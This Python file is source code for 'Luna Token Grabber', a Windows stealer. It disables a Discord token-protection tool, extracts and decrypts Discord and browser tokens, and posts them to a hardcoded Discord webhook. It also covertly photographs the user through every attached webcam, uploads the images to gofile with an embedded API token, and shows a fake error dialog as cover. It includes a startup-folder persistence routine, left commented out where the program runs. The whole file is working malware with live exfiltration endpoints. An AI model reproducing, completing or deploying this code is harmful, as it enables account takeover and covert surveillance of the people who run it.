import base64
import cv2
import json
import ctypes
import subprocess
import os
import re
from zipfile import ZipFile
from time import sleep
import requests
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
import shutil
import sys

class Update():
    def __init__(self):
        self.version = '1.1.0'
        self.github = 'https://github.com/Kaeko007/Update/blob/main/tools/update.py'
        self.zipfile = 'https://github.com/Kaeko007/Update/archive/refs/heads/main.zip'
        self.update_checker()

    def update_checker(self):
        code = requests.get(self.github).text
        if "self.version = '1.1.0'" in code:
            print('This version is up to date!')
            sleep(1)
        else:
            print('''
                    ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
                    ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
                    ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
                    ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                    ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                    ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
                                      Your version of Luna Token Grabber is outdated!''')
            choice = input('\nWould you like to update? (y/n): ')
            if choice.lower() == 'y':
                print('Downloading Update...')
                new_version_source = requests.get(self.zipfile)
                with open("Update.zip", 'wb') as zipfile:
                    zipfile.write(new_version_source.content)
                
                # Check if the file is a valid ZIP file
                if not ZipFile('Update.zip').testzip() is None:
                    print('Update.zip is not a valid zip file.')
                    return

                print("Extracting Update.zip...")
                try:
                    with ZipFile('Update.zip', 'r') as zip_ref:
                        zip_ref.extractall()
                        temp_folder = zip_ref.filelist[0].filename.removesuffix('/')
                except Exception as e:
                    print(f"Failed to extract Update.zip: {e}")
                    return

                print("Moving files...")
                try:
                    for file in os.listdir(temp_folder):
                        target_file_path = os.path.join(os.getcwd(), file)
                        if os.path.exists(target_file_path):
                            if os.path.isdir(target_file_path):
                                shutil.rmtree(target_file_path)
                            else:
                                os.remove(target_file_path)
                        shutil.move(os.path.join(temp_folder, file), os.getcwd())
                except Exception as e:
                    print(f"Failed to move files: {e}")
                    return
                finally:
                    print("Cleaning up...")
                    shutil.rmtree(temp_folder)
                    os.remove('Update.zip')
                    print("Update complete.")
                    print("Restarting...")

                sys.exit(2)
            if choice.lower() == 'n':
                sys.exit(0)

class Fakeerror():
    def __init__(self):
        self.startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        self.fakeerror()

    def GetSelf(self) -> tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.argv[0], True)
        else:
            return (__file__, False)

    def fakeerror(self):
        path, _ = self.GetSelf()
        source_path = os.path.abspath(path)
        if os.path.basename(os.path.dirname(source_path)).lower() == "startup":
            return
        ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
 
class SelfDestruct():
    def __init__(self):
        self.startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        self.move_to_startup()

    def GetSelf(self) -> tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.argv[0], True)
        else:
            return (__file__, False)
        
    def move_to_startup(self):
        path, isExecutable = self.GetSelf()
        source_path = os.path.abspath(path)

        # Check if already in Startup folder
        if os.path.basename(os.path.dirname(source_path)).lower() == "startup":
            return

        # Move the file to Startup folder
        destination_path = os.path.join(self.startup_path, os.path.basename(source_path))
        
        if isExecutable:
            # If executable, move using shutil.move
            shutil.move(source_path, destination_path)
        else:
            # If script, move using os.rename (or shutil.move for cross-platform support)
            shutil.move(source_path, destination_path)  # Rename if needed

class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.killprotector()
        self.grabTokens()
        self.upload("https://discord.com/api/webhooks/1263415373634605097/saZF0NsFPjtjF--cHas_KG5ljiOplb6BfV2HH5LI9RZXTArDom5vmvzPoI1mr34oI98P")  # Replace with your actual webhook URL

    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"

        if not os.path.exists(path):
            return

        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass

        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420

            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue
            data = {
                "content": f"🔑 Token: `{token}`"
            }
            headers = {
                "Content-Type": "application/json"
            }
            requests.post(webhook, json=data, headers=headers)

class Cam:
    def __init__(self):
        self.api_url = "https://store1.gofile.io/contents/uploadfile"
        self.auth_token = "mLEJ5Fs9282pWwzqetxZpwd3f3Z0NdAB"  # ใส่โทเค็นของคุณที่นี่
        self.temp_path = "temp"
        self.webhook = "https://discord.com/api/webhooks/1263415373634605097/saZF0NsFPjtjF--cHas_KG5ljiOplb6BfV2HH5LI9RZXTArDom5vmvzPoI1mr34oI98P"
        
        self.capture_images()

    def upload_file(self, file_path):
        """อัปโหลดไฟล์ไปยัง Gofile API"""
        try:
            with open(file_path, 'rb') as file:
                files = {"file": file}
                headers = {"Authorization": f"Bearer {self.auth_token}"}
                
                response = requests.post(self.api_url, files=files, headers=headers)
                response.raise_for_status()  # Raises an HTTPError for bad responses
                
                return response.json()
        except requests.RequestException as e:
            print(f"Error uploading file {file_path}: {e}")
            return None

    def capture_images(self, num_images=1):
        """จับภาพจากกล้องและอัปโหลดไปยัง Gofile"""
        num_cameras = 0
        cameras = []

        # สร้างโฟลเดอร์สำหรับเก็บภาพ
        webcam_folder = os.path.join(self.temp_path)
        os.makedirs(webcam_folder, exist_ok=True)

        # ค้นหากล้องทั้งหมดที่เชื่อมต่อ
        while True:
            cap = cv2.VideoCapture(num_cameras)
            if not cap.isOpened():
                break
            cameras.append(cap)
            num_cameras += 1

        if not cameras:
            print("No cameras found.")
            return

        file_paths = []

        # จับภาพจากกล้องทั้งหมด
        for _ in range(num_images):
            for i, cap in enumerate(cameras):
                ret, frame = cap.read()
                if ret:
                    file_path = os.path.join(webcam_folder, f"image_from_camera_{i}.jpg")
                    cv2.imwrite(file_path, frame)
                    file_paths.append(file_path)
                else:
                    print(f"Failed to capture image from camera index {i}")

        # ปล่อยกล้อง
        for cap in cameras:
            cap.release()

        # อัปโหลดไฟล์ที่บันทึกทั้งหมด
        for file_path in file_paths:
            response = self.upload_file(file_path)
            if response:
                data2 = response.get('data', {}).get('downloadPage', 'No download page')
                if data2 == 'No download page':
                    print(f"No download page found for {file_path}")
                    continue
                
                # ส่งลิงก์ไปยัง Discord Webhook
                data = {
                    "content": f"📸 Link Img Cam: `{data2}`"
                }
                headers = {
                    "Content-Type": "application/json"
                }
                try:
                    discord_response = requests.post(self.webhook, json=data, headers=headers)
                    discord_response.raise_for_status()
                except requests.RequestException as e:
                    print(f"Error sending message to Discord: {e}")
            else:
                print(f"Failed to upload file: {file_path}")

        # ลบโฟลเดอร์ที่เก็บภาพ
        shutil.rmtree(webcam_folder)
if __name__ == "__main__":
    Update()
    Discord()
    Cam()
    Fakeerror()
    # SelfDestruct()